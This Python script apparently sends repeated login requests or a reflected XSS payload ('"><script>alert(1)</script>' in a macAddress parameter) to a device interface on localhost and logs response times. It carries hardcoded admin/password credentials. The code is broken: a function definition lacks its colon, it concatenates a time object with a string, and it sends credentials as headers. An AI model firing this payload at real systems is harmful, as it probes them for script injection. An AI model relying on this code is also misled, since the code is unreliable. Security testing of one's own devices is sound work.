# Sends a predefined XSS/login HTTP-request to localhost.

import argparse
import ssl
import requests
import warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made to host 'localhost'")

# Write a time to a file
def log(file_name, time)
  f = open(file_name, "a")
  f.write(time + "\n")
  f.close()

# Login to the device
def login(url):
  url = url + '/login.php'
  headers = {'username' : 'admin',
    'password' : 'password',
    'id' : '123456' }

  r = requests.post(url, headers=headers, verify=False)
  print('Response from the server: ' + str(r.status_code))
  print('Response time: ' + str(r.elapsed))
  log("login.txt", r.elapsed)

# Send the attack
def attack(url):
  payload = '?/boardData103?macAddress="><script>alert(1)</script>'

  r = requests.get(url + payload, verify=False)
  print('Response from the server: ' + str(r.status_code))
  print('Response time: ' + str(r.elapsed))
  log("attack.txt", r.elapsed)
    
# Parse url, read args and execute the script
def main():
  if args.https:
    url = 'https://localhost:' + str(args.port)
  else:
    url = 'http://localhost:' + str(args.port)

  for x in range(args.repeats):
    if args.mode == 'xss':
      attack(url)
    else:
      login(url)

# Define the command line parser     
if __name__ == "__main__":
  parser = argparse.ArgumentParser(
    description='Sends a predefined XSS/login -script to localhost and records response times.')
  parser.add_argument('mode',
    type=str,
    choices=['xss', 'login'],
    help='Choses the script mode.')
  parser.add_argument('port',
    type=int, 
    help='Chooses the port: <port>')
  parser.add_argument(
    '--https',
    action='store_true',
    help='Sets HTTPS when logging in.')
  parser.add_argument('-r',
    type=int,
    default=1,
    action='store',
    dest='repeats',
    help='Repeats the request a specified number of time')

  args = parser.parse_args()

  main()
